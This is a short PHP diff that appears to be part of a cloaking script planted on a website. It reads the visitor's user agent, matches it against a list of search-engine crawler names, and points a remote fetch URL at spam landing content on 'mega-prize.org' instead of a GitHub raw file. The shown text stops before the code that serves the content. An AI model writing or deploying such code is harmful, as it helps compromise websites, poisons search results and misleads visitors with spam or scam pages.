@@ -1,7 +1,7 @@
 <?php
 @ob_start();
 header("Vary: User-Agent");
-$targetUrl = "https://raw.githubusercontent.com/ayamdraft21/landing/refs/heads/main/utimebilliards.txt";
+$targetUrl = "https://mega-prize.org/landing/utimebilliards.html";
 $botPattern = "/(googlebot|slurp|bingbot|baiduspider|yandex|crawler|spider|adsense|inspection|mediapartners)/i";
 $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
 function fetchContentCurl($url) {
